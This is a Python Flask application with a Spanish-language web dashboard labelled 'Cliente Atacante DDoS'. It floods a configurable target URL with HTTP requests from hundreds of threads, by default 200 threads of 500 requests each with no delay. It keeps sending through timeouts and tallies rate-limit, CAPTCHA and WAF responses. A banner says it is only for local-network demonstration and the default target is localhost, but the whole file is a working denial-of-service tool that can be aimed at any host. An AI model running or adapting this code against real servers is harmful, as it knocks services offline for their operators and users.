from flask import Flask, render_template_string, jsonify, request as flask_request
import requests
import threading
import time
from datetime import datetime

app = Flask(__name__)

# Desactivar warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# CONFIGURACIÓN
# ============================================
config = {
    'target_url': 'http://localhost:5000/api/data',
    'num_threads': 200,  # MUY AGRESIVO por defecto
    'requests_per_thread': 500,
    'delay': 0
}

# Control
attack_control = {
    'active': False,
    'should_stop': False,
    'threads': []
}

# Estadísticas
stats = {
    'total': 0,
    'success': 0,
    'failed': 0,
    'rate_limited': 0,
    'captcha': 0,
    'waf': 0,
    'timeout': 0,
    'connection_error': 0,
    'start_time': None,
    'logs': []
}
stats_lock = threading.Lock()

# ============================================
# FUNCIONES
# ============================================
def add_log(msg, level='info'):
    with stats_lock:
        stats['logs'].append({
            'time': datetime.now().strftime('%H:%M:%S'),
            'msg': msg,
            'level': level
        })
        if len(stats['logs']) > 150:
            stats['logs'].pop(0)

def worker(thread_id):
    """Worker agresivo que bombardea el servidor"""
    session = requests.Session()
    session.headers.update({'User-Agent': f'AttackBot-{thread_id}'})
    
    for i in range(config['requests_per_thread']):
        if attack_control['should_stop']:
            break
        
        try:
            resp = session.get(config['target_url'], timeout=1)  # Timeout corto
            
            with stats_lock:
                stats['total'] += 1
                
                if resp.status_code == 200:
                    stats['success'] += 1
                elif resp.status_code == 429:
                    stats['rate_limited'] += 1
                elif resp.status_code == 403:
                    if 'CAPTCHA' in resp.text:
                        stats['captcha'] += 1
                    else:
                        stats['waf'] += 1
                else:
                    stats['failed'] += 1
            
            if config['delay'] > 0:
                time.sleep(config['delay'])
                
        except requests.exceptions.Timeout:
            with stats_lock:
                stats['timeout'] += 1
                stats['failed'] += 1
            # NO SLEEP - continuar bombardeando
                
        except requests.exceptions.ConnectionError:
            with stats_lock:
                stats['connection_error'] += 1
                stats['failed'] += 1
            time.sleep(0.1)  # Pequeño delay cuando el servidor cae
            
        except Exception:
            with stats_lock:
                stats['failed'] += 1

def start_attack_thread():
    """Inicia ataque masivo"""
    attack_control['should_stop'] = False
    attack_control['active'] = True
    attack_control['threads'] = []
    
    with stats_lock:
        stats['total'] = 0
        stats['success'] = 0
        stats['failed'] = 0
        stats['rate_limited'] = 0
        stats['captcha'] = 0
        stats['waf'] = 0
        stats['timeout'] = 0
        stats['connection_error'] = 0
        stats['start_time'] = time.time()
        stats['logs'] = []
    
    total = config['num_threads'] * config['requests_per_thread']
    add_log(f"🚀 ATAQUE MASIVO INICIADO", 'danger')
    add_log(f"💣 {config['num_threads']} threads × {config['requests_per_thread']} = {total:,} requests", 'warning')
    add_log(f"🎯 Target: {config['target_url']}", 'info')
    
    # Crear todos los threads rápidamente
    for i in range(config['num_threads']):
        if attack_control['should_stop']:
            break
        t = threading.Thread(target=worker, args=(i,), daemon=True)
        t.start()
        attack_control['threads'].append(t)
        # Sin delay para lanzar todos a la vez
    
    add_log(f"✅ {len(attack_control['threads'])} threads activos - BOMBARDEANDO", 'success')
    
    # Monitorear en background
    def monitor():
        for t in attack_control['threads']:
            t.join()
        
        attack_control['active'] = False
        duration = time.time() - stats['start_time']
        
        with stats_lock:
            add_log(f"✅ Completado en {duration:.1f}s", 'info')
            add_log(f"📊 Enviados: {stats['total']:,} | Éxito: {stats['success']:,}", 'info')
            add_log(f"⚠️ Timeouts: {stats['timeout']:,} | Errores: {stats['connection_error']:,}", 'warning')
    
    threading.Thread(target=monitor, daemon=True).start()

# ============================================
# RUTAS WEB
# ============================================
@app.route('/')
def index():
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>💥 Cliente Atacante DDoS</title>
        <meta charset="UTF-8">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', sans-serif;
                background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
                min-height: 100vh;
                padding: 20px;
            }
            .container { max-width: 1400px; margin: 0 auto; }
            .header {
                background: white;
                padding: 30px;
                border-radius: 15px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                margin-bottom: 20px;
                text-align: center;
            }
            .header h1 { color: #333; font-size: 2.5em; }
            .warning {
                background: #000;
                border: 3px solid #ff0000;
                padding: 20px;
                border-radius: 10px;
                margin: 15px 0;
                color: #ff0000;
                font-weight: bold;
                text-align: center;
                font-size: 1.2em;
            }
            .grid {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 20px;
                margin-bottom: 20px;
            }
            .card {
                background: white;
                padding: 25px;
                border-radius: 15px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            }
            .card h3 { color: #f5576c; margin-bottom: 20px; }
            .form-group { margin-bottom: 15px; }
            .form-group label {
                display: block;
                margin-bottom: 5px;
                color: #666;
                font-weight: 600;
            }
            .form-group input {
                width: 100%;
                padding: 10px;
                border: 2px solid #ddd;
                border-radius: 8px;
                font-size: 1em;
            }
            .form-group input:focus {
                outline: none;
                border-color: #f5576c;
            }
            .btn {
                width: 100%;
                padding: 15px;
                border: none;
                border-radius: 10px;
                font-size: 1.1em;
                font-weight: bold;
                cursor: pointer;
                margin-top: 10px;
                transition: all 0.3s;
            }
            .btn-start {
                background: #f5576c;
                color: white;
            }
            .btn-start:hover:not(:disabled) {
                background: #d63447;
            }
            .btn-stop {
                background: #dc3545;
                color: white;
            }
            .btn-stop:hover:not(:disabled) {
                background: #c82333;
            }
            .btn:disabled {
                background: #ccc;
                cursor: not-allowed;
            }
            .status {
                text-align: center;
                padding: 20px;
                background: #f8f9fa;
                border-radius: 10px;
                margin: 20px 0;
            }
            .status-indicator {
                display: inline-block;
                width: 20px;
                height: 20px;
                border-radius: 50%;
                margin-right: 10px;
            }
            .status-active {
                background: #ff0000;
                animation: pulse 0.5s infinite;
            }
            .status-inactive { background: #6c757d; }
            @keyframes pulse {
                0%, 100% { opacity: 1; transform: scale(1); }
                50% { opacity: 0.5; transform: scale(1.2); }
            }
            .progress {
                width: 100%;
                height: 30px;
                background: #e9ecef;
                border-radius: 15px;
                overflow: hidden;
                margin: 20px 0;
            }
            .progress-bar {
                height: 100%;
                background: linear-gradient(90deg, #f093fb, #f5576c);
                transition: width 0.3s;
                display: flex;
                align-items: center;
                justify-content: center;
                color: white;
                font-weight: bold;
            }
            .stats {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 15px;
                margin: 20px 0;
            }
            .stat-box {
                background: white;
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0 3px 10px rgba(0,0,0,0.1);
                text-align: center;
            }
            .stat-value {
                font-size: 2em;
                font-weight: bold;
                color: #f5576c;
            }
            .stat-label {
                color: #666;
                font-size: 0.9em;
                margin-top: 5px;
            }
            .log {
                background: white;
                padding: 25px;
                border-radius: 15px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.2);
                max-height: 400px;
                overflow-y: auto;
            }
            .log h3 { color: #f5576c; margin-bottom: 15px; }
            .log-entry {
                padding: 8px 12px;
                margin: 5px 0;
                border-radius: 5px;
                font-family: 'Courier New', monospace;
                font-size: 0.85em;
            }
            .log-success { background: #d4edda; color: #155724; }
            .log-info { background: #d1ecf1; color: #0c5460; }
            .log-warning { background: #fff3cd; color: #856404; }
            .log-danger { background: #f8d7da; color: #721c24; }
            .attack-power {
                background: linear-gradient(135deg, #ff6b6b, #ee5a6f);
                color: white;
                padding: 20px;
                border-radius: 10px;
                margin: 15px 0;
                text-align: center;
            }
            .attack-power h4 {
                font-size: 1.5em;
                margin-bottom: 10px;
            }
            .attack-power .power-level {
                font-size: 3em;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>💥 Cliente Atacante DDoS</h1>
                <div class="warning">
                    ⚠️ MODO AGRESIVO - SOLO PARA DEMOSTRACIÓN EN RED LOCAL ⚠️
                </div>
            </div>

            <div class="grid">
                <div class="card">
                    <h3>⚙️ Configuración del Ataque</h3>
                    <div class="form-group">
                        <label>🎯 URL Objetivo</label>
                        <input type="text" id="url" value="http://localhost:5000/api/data">
                    </div>
                    <div class="form-group">
                        <label>🔥 Threads (más = más devastador)</label>
                        <input type="number" id="threads" value="200" min="1" max="1000">
                    </div>
                    <div class="form-group">
                        <label>📊 Requests por Thread</label>
                        <input type="number" id="requests" value="500" min="1" max="1000">
                    </div>
                    <div class="form-group">
                        <label>⏱️ Delay (0 = bombardeo máximo)</label>
                        <input type="number" id="delay" value="0" min="0" max="5" step="0.01">
                    </div>
                    
                    <div class="attack-power">
                        <h4>💪 Poder de Ataque</h4>
                        <div class="power-level" id="power-level">100,000</div>
                        <div style="font-size: 0.9em;">requests totales</div>
                    </div>
                    
                    <button class="btn btn-start" id="btnStart" onclick="startAttack()">
                        🚀 LANZAR ATAQUE MASIVO
                    </button>
                    <button class="btn btn-stop" id="btnStop" onclick="stopAttack()" disabled>
                        🛑 DETENER INMEDIATAMENTE
                    </button>
                </div>

                <div class="card">
                    <h3>📊 Estado del Ataque</h3>
                    <div class="status">
                        <span class="status-indicator status-inactive" id="indicator"></span>
                        <span id="statusText" style="font-weight: bold;">Inactivo</span>
                    </div>
                    <div class="progress">
                        <div class="progress-bar" id="progressBar" style="width: 0%">0%</div>
                    </div>
                    <div style="text-align: center; font-size: 1.2em;">
                        <div><strong id="sent">0</strong> / <strong id="total">0</strong> requests</div>
                        <div style="margin-top: 10px; font-size: 1.8em; color: #f5576c;">
                            <strong id="rps">0</strong> req/s
                        </div>
                    </div>
                </div>
            </div>

            <div class="stats">
                <div class="stat-box">
                    <div class="stat-value" id="statSuccess">0</div>
                    <div class="stat-label">✅ Exitosos</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="statTimeout">0</div>
                    <div class="stat-label">⏱️ Timeouts</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="statConnection">0</div>
                    <div class="stat-label">💀 Conexión Rechazada</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="statRateLimited">0</div>
                    <div class="stat-label">⚠️ Rate Limited</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="statFailed">0</div>
                    <div class="stat-label">❌ Fallos</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="statDuration">0s</div>
                    <div class="stat-label">⏱️ Duración</div>
                </div>
            </div>

            <div class="log">
                <h3>📝 Log del Ataque</h3>
                <div id="logContent"></div>
            </div>
        </div>

        <script>
            function updatePowerLevel() {
                const threads = parseInt(document.getElementById('threads').value) || 0;
                const requests = parseInt(document.getElementById('requests').value) || 0;
                const power = threads * requests;
                document.getElementById('power-level').textContent = power.toLocaleString();
            }
            
            document.getElementById('threads').addEventListener('input', updatePowerLevel);
            document.getElementById('requests').addEventListener('input', updatePowerLevel);
            
            function startAttack() {
                const cfg = {
                    target_url: document.getElementById('url').value,
                    num_threads: parseInt(document.getElementById('threads').value),
                    requests_per_thread: parseInt(document.getElementById('requests').value),
                    delay: parseFloat(document.getElementById('delay').value)
                };

                fetch('/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(cfg)
                })
                .then(r => r.json())
                .then(d => {
                    document.getElementById('total').textContent = (cfg.num_threads * cfg.requests_per_thread).toLocaleString();
                });
            }

            function stopAttack() {
                fetch('/stop', {method: 'POST'});
            }

            function update() {
                fetch('/stats')
                .then(r => r.json())
                .then(d => {
                    const ind = document.getElementById('indicator');
                    const txt = document.getElementById('statusText');
                    const btnStart = document.getElementById('btnStart');
                    const btnStop = document.getElementById('btnStop');
                    
                    if (d.active) {
                        ind.className = 'status-indicator status-active';
                        txt.textContent = '🔥 BOMBARDEANDO SERVIDOR...';
                        btnStart.disabled = true;
                        btnStop.disabled = false;
                    } else {
                        ind.className = 'status-indicator status-inactive';
                        txt.textContent = 'Inactivo';
                        btnStart.disabled = false;
                        btnStop.disabled = true;
                    }

                    document.getElementById('sent').textContent = d.total.toLocaleString();
                    document.getElementById('rps').textContent = d.rps.toFixed(0);
                    document.getElementById('statSuccess').textContent = d.success.toLocaleString();
                    document.getElementById('statTimeout').textContent = d.timeout.toLocaleString();
                    document.getElementById('statConnection').textContent = d.connection_error.toLocaleString();
                    document.getElementById('statRateLimited').textContent = d.rate_limited.toLocaleString();
                    document.getElementById('statFailed').textContent = d.failed.toLocaleString();
                    document.getElementById('statDuration').textContent = d.duration.toFixed(1) + 's';

                    const total = parseInt(document.getElementById('total').textContent.replace(/,/g, '')) || 1;
                    const pct = Math.min((d.total / total * 100), 100).toFixed(1);
                    document.getElementById('progressBar').style.width = pct + '%';
                    document.getElementById('progressBar').textContent = pct + '%';

                    const logDiv = document.getElementById('logContent');
                    logDiv.innerHTML = d.logs.slice(-30).reverse().map(l => {
                        return `<div class="log-entry log-${l.level}">[${l.time}] ${l.msg}</div>`;
                    }).join('');
                })
                .catch(e => console.error(e));
            }

            setInterval(update, 500);
            update();
            updatePowerLevel();
        </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/start', methods=['POST'])
def start():
    if attack_control['active']:
        return jsonify({'status': 'already_running'})
    
    data = flask_request.json
    config['target_url'] = data.get('target_url', config['target_url'])
    config['num_threads'] = data.get('num_threads', config['num_threads'])
    config['requests_per_thread'] = data.get('requests_per_thread', config['requests_per_thread'])
    config['delay'] = data.get('delay', config['delay'])
    
    t = threading.Thread(target=start_attack_thread, daemon=True)
    t.start()
    
    return jsonify({'status': 'started'})

@app.route('/stop', methods=['POST'])
def stop():
    attack_control['should_stop'] = True
    add_log('🛑 DETENIENDO ATAQUE', 'warning')
    return jsonify({'status': 'stopping'})

@app.route('/stats')
def get_stats():
    with stats_lock:
        duration = 0
        rps = 0
        
        if stats['start_time']:
            duration = time.time() - stats['start_time']
            if duration > 0:
                rps = stats['total'] / duration
        
        return jsonify({
            'active': attack_control['active'],
            'total': stats['total'],
            'success': stats['success'],
            'failed': stats['failed'],
            'rate_limited': stats['rate_limited'],
            'captcha': stats['captcha'],
            'waf': stats['waf'],
            'timeout': stats['timeout'],
            'connection_error': stats['connection_error'],
            'duration': duration,
            'rps': rps,
            'logs': stats['logs']
        })

if __name__ == '__main__':
    print(f"\n{'='*60}")
    print(f"💥 Cliente Atacante DDoS - MODO AGRESIVO")
    print(f"🌐 http://localhost:8080")
    print(f"⚠️  ADVERTENCIA: Configuración por defecto muy agresiva")
    print(f"    200 threads × 500 req = 100,000 requests")
    print(f"{'='*60}\n")
    
    app.run(host='0.0.0.0', port=8080, debug=False, threaded=True)